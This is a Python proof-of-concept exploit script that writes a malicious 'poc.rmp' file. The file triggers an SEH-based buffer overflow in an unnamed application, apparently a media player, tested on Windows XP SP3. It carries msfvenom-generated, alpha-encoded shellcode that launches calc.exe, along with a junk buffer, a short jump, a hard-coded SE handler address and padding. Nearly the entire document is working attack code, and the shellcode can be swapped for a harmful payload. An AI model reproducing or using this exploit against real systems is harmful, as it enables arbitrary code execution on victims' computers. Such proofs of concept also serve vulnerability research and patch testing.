import sys
from struct import pack

#msfvenom -p windows/exec --platform windows -a x86 -b '\x00' --encoder x86/alpha_mixed -f python CMD=calc.exe EXITFUNC=seh
#Tested on windows xp sp3 zh
shellcode =  ""
shellcode += "\x89\xe6\xda\xd9\xd9\x76\xf4\x5e\x56\x59\x49\x49"
shellcode += "\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43"
shellcode += "\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30"
shellcode += "\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30"
shellcode += "\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
shellcode += "\x79\x6c\x78\x68\x4c\x42\x55\x50\x57\x70\x37\x70"
shellcode += "\x45\x30\x4c\x49\x4b\x55\x44\x71\x4f\x30\x45\x34"
shellcode += "\x6c\x4b\x50\x50\x34\x70\x4c\x4b\x33\x62\x36\x6c"
shellcode += "\x6c\x4b\x70\x52\x74\x54\x6c\x4b\x72\x52\x47\x58"
shellcode += "\x64\x4f\x4d\x67\x32\x6a\x71\x36\x36\x51\x69\x6f"
shellcode += "\x4e\x4c\x37\x4c\x65\x31\x73\x4c\x76\x62\x36\x4c"
shellcode += "\x35\x70\x4a\x61\x4a\x6f\x66\x6d\x47\x71\x68\x47"
shellcode += "\x38\x62\x4c\x32\x33\x62\x73\x67\x4e\x6b\x56\x32"
shellcode += "\x32\x30\x4c\x4b\x42\x6a\x47\x4c\x4c\x4b\x72\x6c"
shellcode += "\x72\x31\x32\x58\x59\x73\x51\x58\x46\x61\x48\x51"
shellcode += "\x43\x61\x4e\x6b\x72\x79\x61\x30\x43\x31\x59\x43"
shellcode += "\x6c\x4b\x71\x59\x72\x38\x6b\x53\x66\x5a\x43\x79"
shellcode += "\x6c\x4b\x44\x74\x6e\x6b\x37\x71\x68\x56\x64\x71"
shellcode += "\x69\x6f\x4e\x4c\x79\x51\x38\x4f\x76\x6d\x43\x31"
shellcode += "\x68\x47\x44\x78\x59\x70\x51\x65\x58\x76\x76\x63"
shellcode += "\x31\x6d\x5a\x58\x35\x6b\x53\x4d\x54\x64\x61\x65"
shellcode += "\x4a\x44\x32\x78\x4c\x4b\x30\x58\x71\x34\x47\x71"
shellcode += "\x6a\x73\x32\x46\x6c\x4b\x34\x4c\x50\x4b\x4e\x6b"
shellcode += "\x73\x68\x67\x6c\x46\x61\x7a\x73\x6c\x4b\x56\x64"
shellcode += "\x4c\x4b\x37\x71\x58\x50\x4e\x69\x57\x34\x45\x74"
shellcode += "\x31\x34\x31\x4b\x63\x6b\x55\x31\x33\x69\x73\x6a"
shellcode += "\x53\x61\x49\x6f\x4d\x30\x71\x4f\x31\x4f\x43\x6a"
shellcode += "\x6e\x6b\x37\x62\x6a\x4b\x4e\x6d\x73\x6d\x33\x5a"
shellcode += "\x55\x51\x6c\x4d\x6f\x75\x6f\x42\x55\x50\x33\x30"
shellcode += "\x77\x70\x52\x70\x71\x78\x50\x31\x4e\x6b\x70\x6f"
shellcode += "\x4b\x37\x69\x6f\x58\x55\x6f\x4b\x6b\x4e\x56\x6e"
shellcode += "\x64\x72\x38\x6a\x62\x48\x49\x36\x6c\x55\x6f\x4d"
shellcode += "\x6f\x6d\x59\x6f\x4b\x65\x37\x4c\x66\x66\x51\x6c"
shellcode += "\x75\x5a\x4b\x30\x39\x6b\x6b\x50\x53\x45\x47\x75"
shellcode += "\x4f\x4b\x53\x77\x64\x53\x72\x52\x70\x6f\x50\x6a"
shellcode += "\x73\x30\x61\x43\x6b\x4f\x38\x55\x71\x73\x30\x61"
shellcode += "\x42\x4c\x50\x63\x36\x4e\x73\x55\x30\x78\x51\x75"
shellcode += "\x57\x70\x41\x41"

def main():
    filename = "poc.rmp"
    
    buf = "\x41" * 3224 # Junk
    buf+= "\xEB\x06\x90\x90" # Next SEH
    buf+= pack("<L",0x6428878a) # SE handler
	buf +=shellcode
    buf+= "\xCC" * (18224 - len(buf)) # Pad
    
    f = open(filename, 'wb')
    f.write("<?xml version=\"" + buf + "\"?>")
    f.close()
    print "File created!"
    
    return
    

if __name__ == "__main__":
    main()
